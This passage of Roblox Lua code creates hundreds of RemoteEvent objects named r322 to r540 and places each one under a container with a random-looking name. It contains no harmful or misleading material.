r322.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r323 = Instance.new("RemoteEvent")
r323.Name = "r323"
r323.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r324 = Instance.new("RemoteEvent")
r324.Name = "r324"
r324.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r325 = Instance.new("RemoteEvent")
r325.Name = "r325"
r325.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r326 = Instance.new("RemoteEvent")
r326.Name = "r326"
r326.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r327 = Instance.new("RemoteEvent")
r327.Name = "r327"
r327.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r328 = Instance.new("RemoteEvent")
r328.Name = "r328"
r328.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r329 = Instance.new("RemoteEvent")
r329.Name = "r329"
r329.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r33 = Instance.new("RemoteEvent")
r33.Name = "r33"
r33.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r330 = Instance.new("RemoteEvent")
r330.Name = "r330"
r330.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r331 = Instance.new("RemoteEvent")
r331.Name = "r331"
r331.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r332 = Instance.new("RemoteEvent")
r332.Name = "r332"
r332.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r333 = Instance.new("RemoteEvent")
r333.Name = "r333"
r333.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r334 = Instance.new("RemoteEvent")
r334.Name = "r334"
r334.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r335 = Instance.new("RemoteEvent")
r335.Name = "r335"
r335.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r336 = Instance.new("RemoteEvent")
r336.Name = "r336"
r336.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r337 = Instance.new("RemoteEvent")
r337.Name = "r337"
r337.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r338 = Instance.new("RemoteEvent")
r338.Name = "r338"
r338.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r339 = Instance.new("RemoteEvent")
r339.Name = "r339"
r339.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r34 = Instance.new("RemoteEvent")
r34.Name = "r34"
r34.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r340 = Instance.new("RemoteEvent")
r340.Name = "r340"
r340.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r341 = Instance.new("RemoteEvent")
r341.Name = "r341"
r341.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r342 = Instance.new("RemoteEvent")
r342.Name = "r342"
r342.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r343 = Instance.new("RemoteEvent")
r343.Name = "r343"
r343.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r344 = Instance.new("RemoteEvent")
r344.Name = "r344"
r344.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r345 = Instance.new("RemoteEvent")
r345.Name = "r345"
r345.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r346 = Instance.new("RemoteEvent")
r346.Name = "r346"
r346.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r347 = Instance.new("RemoteEvent")
r347.Name = "r347"
r347.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r348 = Instance.new("RemoteEvent")
r348.Name = "r348"
r348.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r349 = Instance.new("RemoteEvent")
r349.Name = "r349"
r349.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r35 = Instance.new("RemoteEvent")
r35.Name = "r35"
r35.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r350 = Instance.new("RemoteEvent")
r350.Name = "r350"
r350.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r351 = Instance.new("RemoteEvent")
r351.Name = "r351"
r351.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r352 = Instance.new("RemoteEvent")
r352.Name = "r352"
r352.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r353 = Instance.new("RemoteEvent")
r353.Name = "r353"
r353.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r354 = Instance.new("RemoteEvent")
r354.Name = "r354"
r354.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r355 = Instance.new("RemoteEvent")
r355.Name = "r355"
r355.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r356 = Instance.new("RemoteEvent")
r356.Name = "r356"
r356.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r357 = Instance.new("RemoteEvent")
r357.Name = "r357"
r357.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r358 = Instance.new("RemoteEvent")
r358.Name = "r358"
r358.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r359 = Instance.new("RemoteEvent")
r359.Name = "r359"
r359.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r36 = Instance.new("RemoteEvent")
r36.Name = "r36"
r36.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r360 = Instance.new("RemoteEvent")
r360.Name = "r360"
r360.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r361 = Instance.new("RemoteEvent")
r361.Name = "r361"
r361.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r362 = Instance.new("RemoteEvent")
r362.Name = "r362"
r362.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r363 = Instance.new("RemoteEvent")
r363.Name = "r363"
r363.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r364 = Instance.new("RemoteEvent")
r364.Name = "r364"
r364.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r365 = Instance.new("RemoteEvent")
r365.Name = "r365"
r365.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r366 = Instance.new("RemoteEvent")
r366.Name = "r366"
r366.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r367 = Instance.new("RemoteEvent")
r367.Name = "r367"
r367.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r368 = Instance.new("RemoteEvent")
r368.Name = "r368"
r368.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r369 = Instance.new("RemoteEvent")
r369.Name = "r369"
r369.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r37 = Instance.new("RemoteEvent")
r37.Name = "r37"
r37.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r370 = Instance.new("RemoteEvent")
r370.Name = "r370"
r370.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r371 = Instance.new("RemoteEvent")
r371.Name = "r371"
r371.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r372 = Instance.new("RemoteEvent")
r372.Name = "r372"
r372.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r373 = Instance.new("RemoteEvent")
r373.Name = "r373"
r373.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r374 = Instance.new("RemoteEvent")
r374.Name = "r374"
r374.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r375 = Instance.new("RemoteEvent")
r375.Name = "r375"
r375.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r376 = Instance.new("RemoteEvent")
r376.Name = "r376"
r376.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r377 = Instance.new("RemoteEvent")
r377.Name = "r377"
r377.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r378 = Instance.new("RemoteEvent")
r378.Name = "r378"
r378.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r379 = Instance.new("RemoteEvent")
r379.Name = "r379"
r379.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r38 = Instance.new("RemoteEvent")
r38.Name = "r38"
r38.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r380 = Instance.new("RemoteEvent")
r380.Name = "r380"
r380.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r381 = Instance.new("RemoteEvent")
r381.Name = "r381"
r381.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r382 = Instance.new("RemoteEvent")
r382.Name = "r382"
r382.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r383 = Instance.new("RemoteEvent")
r383.Name = "r383"
r383.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r384 = Instance.new("RemoteEvent")
r384.Name = "r384"
r384.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r385 = Instance.new("RemoteEvent")
r385.Name = "r385"
r385.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r386 = Instance.new("RemoteEvent")
r386.Name = "r386"
r386.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r387 = Instance.new("RemoteEvent")
r387.Name = "r387"
r387.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r388 = Instance.new("RemoteEvent")
r388.Name = "r388"
r388.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r389 = Instance.new("RemoteEvent")
r389.Name = "r389"
r389.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r39 = Instance.new("RemoteEvent")
r39.Name = "r39"
r39.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r390 = Instance.new("RemoteEvent")
r390.Name = "r390"
r390.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r391 = Instance.new("RemoteEvent")
r391.Name = "r391"
r391.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r392 = Instance.new("RemoteEvent")
r392.Name = "r392"
r392.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r393 = Instance.new("RemoteEvent")
r393.Name = "r393"
r393.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r394 = Instance.new("RemoteEvent")
r394.Name = "r394"
r394.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r395 = Instance.new("RemoteEvent")
r395.Name = "r395"
r395.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r396 = Instance.new("RemoteEvent")
r396.Name = "r396"
r396.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r397 = Instance.new("RemoteEvent")
r397.Name = "r397"
r397.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r398 = Instance.new("RemoteEvent")
r398.Name = "r398"
r398.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r399 = Instance.new("RemoteEvent")
r399.Name = "r399"
r399.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r4 = Instance.new("RemoteEvent")
r4.Name = "r4"
r4.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r40 = Instance.new("RemoteEvent")
r40.Name = "r40"
r40.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r400 = Instance.new("RemoteEvent")
r400.Name = "r400"
r400.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r401 = Instance.new("RemoteEvent")
r401.Name = "r401"
r401.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r402 = Instance.new("RemoteEvent")
r402.Name = "r402"
r402.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r403 = Instance.new("RemoteEvent")
r403.Name = "r403"
r403.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r404 = Instance.new("RemoteEvent")
r404.Name = "r404"
r404.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r405 = Instance.new("RemoteEvent")
r405.Name = "r405"
r405.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r406 = Instance.new("RemoteEvent")
r406.Name = "r406"
r406.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r407 = Instance.new("RemoteEvent")
r407.Name = "r407"
r407.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r408 = Instance.new("RemoteEvent")
r408.Name = "r408"
r408.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r409 = Instance.new("RemoteEvent")
r409.Name = "r409"
r409.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r41 = Instance.new("RemoteEvent")
r41.Name = "r41"
r41.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r410 = Instance.new("RemoteEvent")
r410.Name = "r410"
r410.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r411 = Instance.new("RemoteEvent")
r411.Name = "r411"
r411.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r412 = Instance.new("RemoteEvent")
r412.Name = "r412"
r412.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r413 = Instance.new("RemoteEvent")
r413.Name = "r413"
r413.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r414 = Instance.new("RemoteEvent")
r414.Name = "r414"
r414.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r415 = Instance.new("RemoteEvent")
r415.Name = "r415"
r415.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r416 = Instance.new("RemoteEvent")
r416.Name = "r416"
r416.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r417 = Instance.new("RemoteEvent")
r417.Name = "r417"
r417.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r418 = Instance.new("RemoteEvent")
r418.Name = "r418"
r418.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r419 = Instance.new("RemoteEvent")
r419.Name = "r419"
r419.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r42 = Instance.new("RemoteEvent")
r42.Name = "r42"
r42.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r420 = Instance.new("RemoteEvent")
r420.Name = "r420"
r420.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r421 = Instance.new("RemoteEvent")
r421.Name = "r421"
r421.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r422 = Instance.new("RemoteEvent")
r422.Name = "r422"
r422.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r423 = Instance.new("RemoteEvent")
r423.Name = "r423"
r423.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r424 = Instance.new("RemoteEvent")
r424.Name = "r424"
r424.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r425 = Instance.new("RemoteEvent")
r425.Name = "r425"
r425.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r426 = Instance.new("RemoteEvent")
r426.Name = "r426"
r426.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r427 = Instance.new("RemoteEvent")
r427.Name = "r427"
r427.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r428 = Instance.new("RemoteEvent")
r428.Name = "r428"
r428.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r429 = Instance.new("RemoteEvent")
r429.Name = "r429"
r429.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r43 = Instance.new("RemoteEvent")
r43.Name = "r43"
r43.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r430 = Instance.new("RemoteEvent")
r430.Name = "r430"
r430.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r431 = Instance.new("RemoteEvent")
r431.Name = "r431"
r431.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r432 = Instance.new("RemoteEvent")
r432.Name = "r432"
r432.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r433 = Instance.new("RemoteEvent")
r433.Name = "r433"
r433.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r434 = Instance.new("RemoteEvent")
r434.Name = "r434"
r434.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r435 = Instance.new("RemoteEvent")
r435.Name = "r435"
r435.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r436 = Instance.new("RemoteEvent")
r436.Name = "r436"
r436.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r437 = Instance.new("RemoteEvent")
r437.Name = "r437"
r437.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r438 = Instance.new("RemoteEvent")
r438.Name = "r438"
r438.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r439 = Instance.new("RemoteEvent")
r439.Name = "r439"
r439.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r44 = Instance.new("RemoteEvent")
r44.Name = "r44"
r44.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r440 = Instance.new("RemoteEvent")
r440.Name = "r440"
r440.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r441 = Instance.new("RemoteEvent")
r441.Name = "r441"
r441.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r442 = Instance.new("RemoteEvent")
r442.Name = "r442"
r442.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r443 = Instance.new("RemoteEvent")
r443.Name = "r443"
r443.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r444 = Instance.new("RemoteEvent")
r444.Name = "r444"
r444.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r445 = Instance.new("RemoteEvent")
r445.Name = "r445"
r445.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r446 = Instance.new("RemoteEvent")
r446.Name = "r446"
r446.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r447 = Instance.new("RemoteEvent")
r447.Name = "r447"
r447.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r448 = Instance.new("RemoteEvent")
r448.Name = "r448"
r448.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r449 = Instance.new("RemoteEvent")
r449.Name = "r449"
r449.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r45 = Instance.new("RemoteEvent")
r45.Name = "r45"
r45.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r450 = Instance.new("RemoteEvent")
r450.Name = "r450"
r450.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r451 = Instance.new("RemoteEvent")
r451.Name = "r451"
r451.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r452 = Instance.new("RemoteEvent")
r452.Name = "r452"
r452.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r453 = Instance.new("RemoteEvent")
r453.Name = "r453"
r453.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r454 = Instance.new("RemoteEvent")
r454.Name = "r454"
r454.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r455 = Instance.new("RemoteEvent")
r455.Name = "r455"
r455.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r456 = Instance.new("RemoteEvent")
r456.Name = "r456"
r456.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r457 = Instance.new("RemoteEvent")
r457.Name = "r457"
r457.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r458 = Instance.new("RemoteEvent")
r458.Name = "r458"
r458.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r459 = Instance.new("RemoteEvent")
r459.Name = "r459"
r459.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r46 = Instance.new("RemoteEvent")
r46.Name = "r46"
r46.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r460 = Instance.new("RemoteEvent")
r460.Name = "r460"
r460.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r461 = Instance.new("RemoteEvent")
r461.Name = "r461"
r461.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r462 = Instance.new("RemoteEvent")
r462.Name = "r462"
r462.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r463 = Instance.new("RemoteEvent")
r463.Name = "r463"
r463.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r464 = Instance.new("RemoteEvent")
r464.Name = "r464"
r464.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r465 = Instance.new("RemoteEvent")
r465.Name = "r465"
r465.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r466 = Instance.new("RemoteEvent")
r466.Name = "r466"
r466.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r467 = Instance.new("RemoteEvent")
r467.Name = "r467"
r467.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r468 = Instance.new("RemoteEvent")
r468.Name = "r468"
r468.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r469 = Instance.new("RemoteEvent")
r469.Name = "r469"
r469.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r47 = Instance.new("RemoteEvent")
r47.Name = "r47"
r47.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r470 = Instance.new("RemoteEvent")
r470.Name = "r470"
r470.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r471 = Instance.new("RemoteEvent")
r471.Name = "r471"
r471.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r472 = Instance.new("RemoteEvent")
r472.Name = "r472"
r472.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r473 = Instance.new("RemoteEvent")
r473.Name = "r473"
r473.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r474 = Instance.new("RemoteEvent")
r474.Name = "r474"
r474.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r475 = Instance.new("RemoteEvent")
r475.Name = "r475"
r475.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r476 = Instance.new("RemoteEvent")
r476.Name = "r476"
r476.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r477 = Instance.new("RemoteEvent")
r477.Name = "r477"
r477.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r478 = Instance.new("RemoteEvent")
r478.Name = "r478"
r478.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r479 = Instance.new("RemoteEvent")
r479.Name = "r479"
r479.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r48 = Instance.new("RemoteEvent")
r48.Name = "r48"
r48.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r480 = Instance.new("RemoteEvent")
r480.Name = "r480"
r480.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r481 = Instance.new("RemoteEvent")
r481.Name = "r481"
r481.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r482 = Instance.new("RemoteEvent")
r482.Name = "r482"
r482.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r483 = Instance.new("RemoteEvent")
r483.Name = "r483"
r483.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r484 = Instance.new("RemoteEvent")
r484.Name = "r484"
r484.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r485 = Instance.new("RemoteEvent")
r485.Name = "r485"
r485.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r486 = Instance.new("RemoteEvent")
r486.Name = "r486"
r486.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r487 = Instance.new("RemoteEvent")
r487.Name = "r487"
r487.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r488 = Instance.new("RemoteEvent")
r488.Name = "r488"
r488.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r489 = Instance.new("RemoteEvent")
r489.Name = "r489"
r489.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r49 = Instance.new("RemoteEvent")
r49.Name = "r49"
r49.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r490 = Instance.new("RemoteEvent")
r490.Name = "r490"
r490.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r491 = Instance.new("RemoteEvent")
r491.Name = "r491"
r491.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r492 = Instance.new("RemoteEvent")
r492.Name = "r492"
r492.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r493 = Instance.new("RemoteEvent")
r493.Name = "r493"
r493.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r494 = Instance.new("RemoteEvent")
r494.Name = "r494"
r494.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r495 = Instance.new("RemoteEvent")
r495.Name = "r495"
r495.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r496 = Instance.new("RemoteEvent")
r496.Name = "r496"
r496.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r497 = Instance.new("RemoteEvent")
r497.Name = "r497"
r497.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r498 = Instance.new("RemoteEvent")
r498.Name = "r498"
r498.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r499 = Instance.new("RemoteEvent")
r499.Name = "r499"
r499.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r5 = Instance.new("RemoteEvent")
r5.Name = "r5"
r5.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r50 = Instance.new("RemoteEvent")
r50.Name = "r50"
r50.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r500 = Instance.new("RemoteEvent")
r500.Name = "r500"
r500.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r501 = Instance.new("RemoteEvent")
r501.Name = "r501"
r501.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r502 = Instance.new("RemoteEvent")
r502.Name = "r502"
r502.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r503 = Instance.new("RemoteEvent")
r503.Name = "r503"
r503.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r504 = Instance.new("RemoteEvent")
r504.Name = "r504"
r504.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r505 = Instance.new("RemoteEvent")
r505.Name = "r505"
r505.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r506 = Instance.new("RemoteEvent")
r506.Name = "r506"
r506.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r507 = Instance.new("RemoteEvent")
r507.Name = "r507"
r507.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r508 = Instance.new("RemoteEvent")
r508.Name = "r508"
r508.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r509 = Instance.new("RemoteEvent")
r509.Name = "r509"
r509.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r51 = Instance.new("RemoteEvent")
r51.Name = "r51"
r51.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r510 = Instance.new("RemoteEvent")
r510.Name = "r510"
r510.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r511 = Instance.new("RemoteEvent")
r511.Name = "r511"
r511.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r512 = Instance.new("RemoteEvent")
r512.Name = "r512"
r512.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r513 = Instance.new("RemoteEvent")
r513.Name = "r513"
r513.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r514 = Instance.new("RemoteEvent")
r514.Name = "r514"
r514.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r515 = Instance.new("RemoteEvent")
r515.Name = "r515"
r515.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r516 = Instance.new("RemoteEvent")
r516.Name = "r516"
r516.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r517 = Instance.new("RemoteEvent")
r517.Name = "r517"
r517.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r518 = Instance.new("RemoteEvent")
r518.Name = "r518"
r518.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r519 = Instance.new("RemoteEvent")
r519.Name = "r519"
r519.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r52 = Instance.new("RemoteEvent")
r52.Name = "r52"
r52.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r520 = Instance.new("RemoteEvent")
r520.Name = "r520"
r520.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r521 = Instance.new("RemoteEvent")
r521.Name = "r521"
r521.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r522 = Instance.new("RemoteEvent")
r522.Name = "r522"
r522.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r523 = Instance.new("RemoteEvent")
r523.Name = "r523"
r523.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r524 = Instance.new("RemoteEvent")
r524.Name = "r524"
r524.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r525 = Instance.new("RemoteEvent")
r525.Name = "r525"
r525.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r526 = Instance.new("RemoteEvent")
r526.Name = "r526"
r526.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r527 = Instance.new("RemoteEvent")
r527.Name = "r527"
r527.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r528 = Instance.new("RemoteEvent")
r528.Name = "r528"
r528.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r529 = Instance.new("RemoteEvent")
r529.Name = "r529"
r529.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r53 = Instance.new("RemoteEvent")
r53.Name = "r53"
r53.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r530 = Instance.new("RemoteEvent")
r530.Name = "r530"
r530.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r531 = Instance.new("RemoteEvent")
r531.Name = "r531"
r531.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r532 = Instance.new("RemoteEvent")
r532.Name = "r532"
r532.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r533 = Instance.new("RemoteEvent")
r533.Name = "r533"
r533.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r534 = Instance.new("RemoteEvent")
r534.Name = "r534"
r534.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r535 = Instance.new("RemoteEvent")
r535.Name = "r535"
r535.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r536 = Instance.new("RemoteEvent")
r536.Name = "r536"
r536.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r537 = Instance.new("RemoteEvent")
r537.Name = "r537"
r537.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r538 = Instance.new("RemoteEvent")
r538.Name = "r538"
r538.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r539 = Instance.new("RemoteEvent")
r539.Name = "r539"
r539.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r54 = Instance.new("RemoteEvent")
r54.Name = "r54"
r54.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r540 = Instance.new("RemoteEvent")
